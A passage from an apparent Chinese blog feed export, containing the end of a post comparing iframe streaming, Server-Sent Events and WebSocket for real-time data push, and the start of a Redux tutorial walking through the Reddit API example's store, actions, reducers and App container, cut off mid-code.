class="string">"',\"*\")&lt;/script&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><p>我们不能直接在返回的script中去调用irame parent的process方法，而是应该使用HTML5 XDM(跨文档消息传递)来传递信息，不然会被浏览器阻止的:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SecurityError: Blocked a frame with origin &quot;http://www.&lt;domain&gt;.com&quot; from accessing a cross-origin frame.</span><br></pre></td></tr></table></figure></p><p><strong>效果</strong></p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/irame.png" alt=""></p><p><strong>不足</strong></p><p>标签页会一直处于加载状态，影响用户体验,这个是有解决方案的，如HTML file数据流，在这里不详解。</p><h3 id="SSE-服务器推送事件"><a href="#SSE-服务器推送事件" class="headerlink" title="SSE(服务器推送事件)"></a>SSE(服务器推送事件)</h3><p>服务器器推送事件是HTML5新技术，有更好的易用性和可兼容性。大部分主流浏览器都已经支持，IE这货，垃圾，都不想说了。国内居然还有许多人使用这玩意儿，人家微软自己都抛弃了。</p><p>劝君退IE，保平安。</p><p>SSE是完全的服务端推送，并没有把客户端向服务端发送数据包含在内，但是这一部分我们可以通过ajax或者Fetch API来实现，这也是它与WebSocket的不同点之一。</p><p>SSE会在连接意外断开时自动重连。</p><h4 id="技术实现-2"><a href="#技术实现-2" class="headerlink" title="技术实现"></a>技术实现</h4><p><strong>客户端</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> source = <span class="keyword">new</span> EventSource(<span class="string">"http://localhost:8088/"</span>);</span><br><span class="line">source.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"接受到数据:"</span> + event.data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>服务端</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> parms = urlLib.parse(req.url,<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(parms.pathname === <span class="string">'/'</span>)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(req.headers);</span><br><span class="line">        res.writeHeader(<span class="number">200</span>,&#123;</span><br><span class="line">            <span class="string">'Access-Control-Allow-Origin'</span>:<span class="string">'*'</span>,<span class="string">'Access-Control-Allow-Method'</span>:<span class="string">'GET,POST'</span></span><br><span class="line">        ,<span class="string">'Content-Type'</span>:<span class="string">'text/event-stream'</span>&#125;);</span><br><span class="line">        setInterval(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">            res.write(<span class="string">"id :"</span> + count++ + <span class="string">'\n'</span>);</span><br><span class="line">            res.write(<span class="string">"data: "</span> + <span class="keyword">new</span> <span class="built_in">Date</span>().toLocaleDateString() + <span class="string">' '</span> + count + <span class="string">'\n\n'</span>);</span><br><span class="line">        &#125;,<span class="number">2000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).listen(<span class="number">8088</span>);</span><br></pre></td></tr></table></figure></p><p><strong>效果</strong></p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/sseClient.png" alt=""></p><p><strong>注意</strong></p><p>. 返回数据MIME类型必须为”text/event-stream”</p><p>. 注意数据格式要符号标准:</p><p>多个数据之间空行隔开，为确保连接断开后数据的有序性，加入id，这样在连接断开时，客户端请求头会有特殊的头信息”Last-Event-ID”,便于服务器知道下一步应该触发那个事件。</p><p>并不是所有浏览器都支持SSE：以下是浏览器支持情况:</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/sse.png" alt=""></p><h3 id="SSE与WebSocket对比"><a href="#SSE与WebSocket对比" class="headerlink" title="SSE与WebSocket对比:"></a>SSE与WebSocket对比:</h3><p><strong>浏览器支持程度</strong></p><p>可见，两者支持程度差不多</p><p><strong>SSE优势</strong><br>WebSocket是与http同一级别的引用层通信协议，其复杂度比SSE要高;且WebSockets需要服务器支持，即SSE存在’基础设施优势’;</p><p><strong>WebSocket优势</strong><br>但是对于二进制数据来说，WebSocket是二进制协议，SSE为文本协议，对于二进制数据的传输，WebSockets更适合。</p><p>而WebSockets最大的优势是其是全双工通信的，可以很方便的实现两端的自由交流。</p><h3 id="适用场景分析"><a href="#适用场景分析" class="headerlink" title="适用场景分析:"></a>适用场景分析:</h3><p>不同的场景，适宜不同解决方案。并不是每一个场景都适合数据推送方式。</p><ol><li><p>如果服务端推送数据够频繁，就用数据推送，对于推送频率太低，例如几分钟一个这种，直接用数据拉取的方式更好，这样可以减少服务器资源占用。</p></li><li><p>客户端发送数据频率：如果发送频率大于1次/秒，甚至更频繁，WebSocket更适合</p></li><li><p>是否需要二进制数据交流，如果有大量二进制数据需要传输，用WebSocket</p></li><li><p>如果大部分用户是移动用户，用数据推送</p></li><li><p>其他</p></li></ol><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>可见，开发的难点，不在于具体技术细节，而在于当面对多个解决方案时，如何选择与特定场景更匹配的方式。这需要我们考虑到许多问题。这些问题会涉及到整个工程的方方面面。甚至还有你的信仰。</p><p><strong>Web，让世界更美好。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;数据推送业务场景非常之多，如股票信息实时推送，赛事实时直播，IM（即时）通信如QQ,WeChat等。&lt;/p&gt;
&lt;p&gt;在6月份我发表过一篇关于socket.io的文章，当时介绍过：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Socket.IO除了支持WebSocket通讯协议外，还支持许多种轮询（Polling）机制以及其它实时通信方式，并封装成了通用的接口，并且在服务端实现了这些实时机制的相应代码。Socket.IO实现的Polling通信机制包括Adobe Flash Socket、AJAX长轮询、AJAX multipart streaming、持久Iframe、JSONP轮询等。Socket.IO能够根据浏览器对通讯机制的支持情况自动地选择最佳的方式来实现网络实时应用。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;WebSocket通信协议非常棒，但是有一些场景，WebSocket这种方案不是最佳的。而且考虑到兼容性的问题，在浏览器不支持WebSocket的情况下，需要通过hack，利用其它解决方案来解决问题。&lt;/p&gt;
&lt;p&gt;所以，对于不同的应用场景，需要从各方面考虑，诸如成本，兼容，用户体验等，来选择最佳解决方案。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;文章目录:&lt;/strong&gt;（整个发展过程为数据拉取到数据推送，再到全双工通信）&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;简单粗暴的短轮询（数据拉取）&lt;/li&gt;
&lt;li&gt;进化的长轮询（long Polling)&lt;/li&gt;
&lt;li&gt;HTTP流&lt;/li&gt;
&lt;li&gt;Iframe流&lt;/li&gt;
&lt;li&gt;SSE（服务器推送事件)&lt;/li&gt;
&lt;li&gt;SSE与WebSocket对比分析&lt;/li&gt;
&lt;li&gt;适用场景分析&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="HTML5" scheme="http://luoxia.me/code/categories/HTML5/"/>
    
    
      <category term="数据推送" scheme="http://luoxia.me/code/tags/%E6%95%B0%E6%8D%AE%E6%8E%A8%E9%80%81/"/>
    
      <category term="即时通信" scheme="http://luoxia.me/code/tags/%E5%8D%B3%E6%97%B6%E9%80%9A%E4%BF%A1/"/>
    
  </entry>
  
  <entry>
    <title>Redux管理复杂应用数据逻辑</title>
    <link href="http://luoxia.me/code/2016/10/04/Redux%E7%AE%A1%E7%90%86%E5%A4%8D%E6%9D%82%E5%BA%94%E7%94%A8%E6%95%B0%E6%8D%AE%E9%80%BB%E8%BE%91/"/>
    <id>http://luoxia.me/code/2016/10/04/Redux管理复杂应用数据逻辑/</id>
    <published>2016-10-04T11:57:32.000Z</published>
    <updated>2017-11-16T13:10:06.485Z</updated>
    
    <content type="html"><![CDATA[<p>也许你也感受到web世界的变化，web客户端从简单的展示性页面向着越来越复杂的web应用转化。而在前后端分离下的开发模式下，客户端数据逻辑变得纷繁复杂，难以维护。React设计理念之一为单向数据流，这从一方面方便了数据的管理。但是React本身只是view，并没有提供完备的数据管理方案。应由而生的其周边类库，诸如ImmutableJS不变数据解决方案，flux作为state管理方案。而redux即为类似于flux的数据解决方案。虽然文章分类于react，但是并不代表redux就与react有着必然的联系。其作为独立的库，适用于多个应由框架甚至是原生JavaScript。</p><p>类似于Redux的，有为Vue设计的Vuex。Redux/Vuex的数据管理方案，深深地透露出函数式编程(FP)的思想。对于习惯了面向对象(OO)思想的我们来说，函数式编程也是一大挑战。所以本人也打算对函数式编程的一些主要概率进行总结，作为单独的一篇文章。<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/redux-flow.jpeg" alt="原理图"></p><p><strong>国庆节还在写代码的，一定是单身狗</strong></p><a id="more"></a><h3 id="整体分析"><a href="#整体分析" class="headerlink" title="整体分析:"></a>整体分析:</h3><ol><li>应用分为两个大部分，一个是UI,一个是数据，    UI根据数据来渲染，不同的数据渲染出不同的UI，即是UI的各个状态state;</li></ol><ol><li>State如何改变：用户产生操作，触发事件，组件层次设计为两类，一类为展示性组件(Dumb/Presentational Components)，不处理数据逻辑相关，一类为容器组件（Smart/Container Components)展示性组件根据用户操作触发事件，向容器组件派发，容器组件发生dispatch。</li></ol><ol><li>传入dispatch的为Action生成函数，Action为一个含有type属性的js对象，但是通过Middleware即中间件，可以让action生成函数不一定直接返回对象，如redux-thunk中间件可以让其返回函数，根据这个，可以处理异步的数据流。</li></ol><ol><li>reducer指定如何更新Sate,其为纯函数，并且不直接修改原始state，而是保持原有state不变，返回全新的state</li></ol><ol><li>state更新，触发渲染，UI更新。</li></ol><h3 id="三大原则"><a href="#三大原则" class="headerlink" title="三大原则:"></a>三大原则:</h3><h4 id="单一数据源"><a href="#单一数据源" class="headerlink" title="单一数据源"></a>单一数据源</h4><p>即整个应用只有一个store来管理state，与flux明显不同，这样使得管理更加方便，但也需要我们自己去分解store,这个可以通过分解reducer来实现</p><h4 id="State的改变只能通过分发action"><a href="#State的改变只能通过分发action" class="headerlink" title="State的改变只能通过分发action"></a>State的改变只能通过分发action</h4><p>即State是只读的，应用中不能直接修改state,只能产生dispatch,靠action生成函数生成action,然后reducer更新state</p><h4 id="通过纯函数修改State"><a href="#通过纯函数修改State" class="headerlink" title="通过纯函数修改State"></a>通过纯函数修改State</h4><p>纯函数的问题，也是来自于函数式编程思想，我们在中学时学的函数就是纯函数，对于同一个输入，必然有相同的输出。这就保证了数据的可控性。什么情况下导致函数不纯呢？</p><p>如：</p><p>. 修改传入参数；</p><p>. 执行有副作用的操作，如 API 请求和路由跳转；</p><p>. 调用非纯函数，如 Date.now() 或 Math.random()。</p><p>state每次更新，原本的state保持不变，这使得利用redux实现时间旅行，撤销重做更加容易。如更改一个state对象的某个属性:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">Object</span>.assign(&#123;&#125;,state,&#123;</span><br><span class="line">           [action.reddit]: posts(state,action)</span><br><span class="line">       &#125;);</span><br></pre></td></tr></table></figure><p>或者使用ES7的对象rest语法:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> &#123;...state,[action.reddit]: posts(state,action)&#125;</span><br></pre></td></tr></table></figure><p>或者可以使用immutable.js库，生成不变的数据类型。</p><h3 id="直接上实例，逐步分析"><a href="#直接上实例，逐步分析" class="headerlink" title="直接上实例，逐步分析"></a>直接上实例，逐步分析</h3><p>以官方的Reddit API实例来分析，这个例子涉及到主要的知识点，包括一些高级的中间件，异步数据流，以及组件层次的设计等。</p><h4 id="index-js入口文件："><a href="#index-js入口文件：" class="headerlink" title="index.js入口文件："></a>index.js入口文件：</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;createStore,applyMiddleware,compose&#125; <span class="keyword">from</span> <span class="string">'redux'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;Provider&#125; <span class="keyword">from</span> <span class="string">'react-redux'</span>;</span><br><span class="line"><span class="keyword">import</span> thunk <span class="keyword">from</span> <span class="string">'redux-thunk'</span>;</span><br><span class="line"><span class="keyword">import</span> createLogger <span class="keyword">from</span> <span class="string">'redux-logger'</span>;</span><br><span class="line"><span class="keyword">import</span> reducer <span class="keyword">from</span> <span class="string">'./reducers/index'</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./containers/App'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> middleWare = [thunk,createLogger()];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = createStore(</span><br><span class="line">    reducer,compose(</span><br><span class="line">        applyMiddleware(...middleWare),</span><br><span class="line">        <span class="built_in">window</span>.devToolsExtension ? <span class="built_in">window</span>.devToolsExtension() : <span class="function"><span class="params">f</span> =&gt;</span> f</span><br><span class="line">    )   </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">    &lt;Provider store=&#123;store&#125;&gt;</span><br><span class="line">        &lt;App/&gt;</span><br><span class="line">    &lt;<span class="regexp">/Provider&gt;,</span></span><br><span class="line"><span class="regexp">    document.getElementById('root')</span></span><br><span class="line"><span class="regexp">);</span></span><br></pre></td></tr></table></figure><p>首先上面的store常量即为整个应用的唯一store,通过createStore()方法生成，其参数有reducer,以及使用的默认state,使用的中间件，applyMiddleWare使用一系列的中间件，它的作用是对action creater返回的数据进行处理，然后交给reducer。</p><p>react-redux使得react更好的和redux结合，提供Provider组件包裹我们的组件，这样我们的组件就能直接访问到dispatch方法和state.我们可以利用后面讲到的connect方法将组件和redux连接。</p><h4 id="action"><a href="#action" class="headerlink" title="action"></a>action</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> REQUEST_POSTS = <span class="string">'REQUEST_POSTS'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> RECEIVE_POSTS = <span class="string">'RECEIVE_POSTS'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> SELECT_REDDIT = <span class="string">'SELECT_REDDIT'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> INVALIDATE_REDDIT = <span class="string">'INVALIDATE_REDDIT'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> selectReddit = <span class="function"><span class="params">reddit</span> =&gt;</span> (&#123;</span><br><span class="line">    type: SELECT_REDDIT,</span><br><span class="line">    reddit</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> requestPosts = <span class="function"><span class="params">reddit</span> =&gt;</span> (&#123;</span><br><span class="line">    type: REQUEST_POSTS,</span><br><span class="line">    reddit</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> receivePosts = <span class="function">(<span class="params">reddit,json</span>)=&gt;</span>(&#123;</span><br><span class="line">    type: RECEIVE_POSTS,</span><br><span class="line">    reddit,</span><br><span class="line">    posts: json.data.children.map(<span class="function"><span class="params">child</span>=&gt;</span>child.data),</span><br><span class="line">    receivedAt: <span class="built_in">Date</span>.now()</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> invalidateReddit = <span class="function"><span class="params">reddit</span> =&gt;</span> (&#123;</span><br><span class="line">    type: INVALIDATE_REDDIT,</span><br><span class="line">    reddit</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fetchPosts = <span class="function"><span class="params">reddit</span> =&gt;</span> dispatch =&gt; &#123;</span><br><span class="line">    dispatch(requestPosts(reddit));</span><br><span class="line">    <span class="keyword">return</span> fetch(<span class="string">`https://www.reddit.com/r/<span class="subst">$&#123;reddit&#125;</span>.json`</span>)</span><br><span class="line">        .then(<span class="function"><span class="params">response</span>=&gt;</span>response.json())</span><br><span class="line">        .then(<span class="function"><span class="params">json</span>=&gt;</span>dispatch(receivePosts(reddit,json)));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> shouldFetchPosts= <span class="function">(<span class="params">state,reddit</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> posts = state.postsByReddit[reddit];</span><br><span class="line">    <span class="keyword">if</span>(!posts) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(posts.isFetching) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> posts.didInvalidate;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> fetchPostsIfNeeded = <span class="function"><span class="params">reddit</span> =&gt;</span> (dispatch,getState) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(shouldFetchPosts(getState(),reddit))&#123;</span><br><span class="line">        <span class="keyword">return</span> dispatch(fetchPosts(reddit));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到上述的fetchPosts函数，返回的并不是一个action对象，而是返回了一个函数，这个默认redux是没法处理的，这就需要使用中间件处理了，redux-thunk中间件用于处理返回函数的函数，thunk函数在我之前的一篇’异步编程解决方案’也提到过，即接受回调函数的函数。这里返回的这个函数，其又返回一个promise对象，即通过fetch API异步发起请求，最终返回Promise对象。这里传入的dispatch也是中间件封装dispatch()方法的作用结果。</p><h4 id="reducer"><a href="#reducer" class="headerlink" title="reducer"></a>reducer</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;combineReducers&#125; <span class="keyword">from</span> <span class="string">'redux'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">    REQUEST_POSTS,RECEIVE_POSTS,</span><br><span class="line">    SELECT_REDDIT,INVALIDATE_REDDIT</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">'../actions/index.js'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> selectReddit = <span class="function">(<span class="params">state = <span class="string">'reactjs'</span>, action</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span>(action.type)&#123;</span><br><span class="line">        <span class="keyword">case</span> SELECT_REDDIT:</span><br><span class="line">            <span class="keyword">return</span> action.reddit;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> state;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> posts = (state = &#123;</span><br><span class="line">    isFetching:<span class="literal">false</span>,</span><br><span class="line">    didInvalidate:<span class="literal">false</span>,</span><br><span class="line">    items:[]</span><br><span class="line">&#125;,action) =&gt; &#123;</span><br><span class="line">    <span class="keyword">switch</span>(action.type)&#123;</span><br><span class="line">        <span class="keyword">case</span> INVALIDATE_REDDIT:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">Object</span>.assign(&#123;&#125;,state,&#123;<span class="attr">didInvalidate</span>:<span class="literal">true</span>&#125;);</span><br><span class="line">        <span class="keyword">case</span> REQUEST_POSTS:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">Object</span>.assign(&#123;&#125;,state,&#123;<span class="attr">isFetching</span>:<span class="literal">true</span>,<span class="attr">didInvalidate</span>:<span class="literal">false</span>&#125;);</span><br><span class="line">        <span class="keyword">case</span> RECEIVE_POSTS:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">Object</span>.assign(&#123;&#125;,state,&#123;<span class="attr">isFetching</span>:<span class="literal">false</span>,<span class="attr">didInvalidate</span>:<span class="literal">false</span>,<span class="attr">items</span>:action.posts,<span class="attr">lastUpdated</span>:action.receivedAt&#125;);</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> state;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> postsByReddit = <span class="function">(<span class="params">state=&#123; &#125;,action</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(action.type)&#123;</span><br><span class="line">        <span class="keyword">case</span> INVALIDATE_REDDIT:</span><br><span class="line">        <span class="keyword">case</span> REQUEST_POSTS:</span><br><span class="line">        <span class="keyword">case</span> RECEIVE_POSTS:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">Object</span>.assign(&#123;&#125;,state,&#123;</span><br><span class="line">                [action.reddit]: posts(state,action)</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> state;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> rootReducer = combineReducers(&#123;</span><br><span class="line">    postsByReddit,</span><br><span class="line">    selectReddit</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> rootReducer;</span><br></pre></td></tr></table></figure><p>可见，这种写法用到了一种技巧，即对大的state进行了分解，一部分为postsByReddit，一部分为selectReddit,避免了代码的冗长，最后只需通过combineReducers()方法将分解的reducer结合即可。</p><h4 id="设计组件层次"><a href="#设计组件层次" class="headerlink" title="设计组件层次"></a>设计组件层次</h4><p>按照之前所述的组件层次设计哲学思想，将组件分为container组件和展示组件，只让container来产生dispatch,而这个container哪些组件才有资格担任呢？通常是App即最外层父组件，然后当我们在使用react-router的时候，每个route都可以作为单独的container与redux相连接。</p><p>来看看这个例子的App.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> React,&#123;Component&#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;connect&#125; <span class="keyword">from</span> <span class="string">'react-redux'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;selectReddit,invalidateReddit,fetchPostsIfNeeded&#125; <span class="keyword">from</span> <span class="string">'../actions/index'</span>;</span><br><span class="line"><span class="keyword">import</span> Picker <span class="keyword">from</span> <span class="string">'../components/Picker'</span>;</span><br><span class="line"><span class="keyword">import</span> Posts <span class="keyword">from</span> <span class="string">'../components/Posts'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    componentDidMount()&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;dispatch,selectReddit&#125; = <span class="keyword">this</span>.props;</span><br><span class="line">        dispatch(fetchPostsIfNeeded(selectReddit));</span><br><span class="line">    &#125;</span><br><span class="line">    handleChange(nextReddit)&#123;</span><br><span class="line">        <span class="keyword">this</span>.props.dispatch(selectReddit(nextReddit));</span><br><span class="line">    &#125;</span><br><span class="line">    handleRefreshClick(e)&#123;</span><br><span class="line">        e.preventDefault();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> &#123;dispatch,selectReddit&#125; = <span class="keyword">this</span>.props;</span><br><span class="line">        dispatch(invalidateReddit(selectReddit));</span><br><span class="line">        dispatch(fetchPostsIfNeeded(selectReddit));</span><br><span class="line">    &#125;</span><br><span class="line">    componentWillReceiveProps(nextProps) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nextProps.selectReddit !== <span class="keyword">this</span>.props.selectReddit) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; dispatch, selectReddit &#125; = nextProps;</span><br><span class="line">            dispatch(fetchPostsIfNeeded(selectReddit));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    render()&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;posts,selectReddit,lastUpdated,isFetching&#125; = <span class="keyword">this</span>.props;</span><br><span class="line">        <span class="keyword">const</span> isEmpty = posts.length === <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                &lt;Picker value=&#123;selectReddit&#125;</span><br><span class="line">                        onChange=&#123;<span class="keyword">this</span>.handleChange.bind(<span class="keyword">this</span>)&#125;</span><br><span class="line">                        options=&#123;[<span class="string">'reactjs'</span>,<span class="string">'frontend'</span>]&#125;/&gt;</span><br><span class="line">                &lt;p&gt;</span><br><span class="line">                    &#123;</span><br><span class="line">                        